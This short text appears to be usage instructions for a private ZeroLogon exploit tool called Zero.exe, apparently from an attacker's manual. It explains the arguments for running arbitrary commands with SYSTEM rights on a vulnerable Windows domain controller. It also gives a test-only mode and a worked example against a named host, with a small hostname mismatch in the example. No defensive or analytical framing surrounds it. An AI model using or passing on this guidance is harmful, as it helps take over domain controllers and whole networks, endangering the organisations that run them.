Zero.exe of our design ::

Cite

    USAGE: ZERO.EXE IP DC DOMAIN ADMIN_USERNAME [-c] COMMAND [-remote]:
    ---------------------------------------------
    where:
    IP - ip address of domain controller
    DC - domain controller name
    DOMAIN - domain name, e.g. home.local
    ADMIN_USERNAME - account name of the administrator. can be default <Administrator> or something else
    -c - optional, use it when command is not binary executable itself
    COMMAND - command that will be executed on domain controller. should be surrounded by quotes
    -remote - if target is outside of current subnet


    or

    ZERO.EXE -test IP DC
    to test if the target is vulnurable only


    Executing code on a vulnerable ZeroLogon DC:
    zero.exe 192.168.22.5 CCGPDC cccnetwork.com Administrator -c "whoami > C:\ProgramData\loggg5.txt"


    192.168.22.5 - ipac PDC
    GCCPDC - PDC hostname
    cccnetwork.com - domain
    Administrator - Any YES
    -c > command which is executed from the system
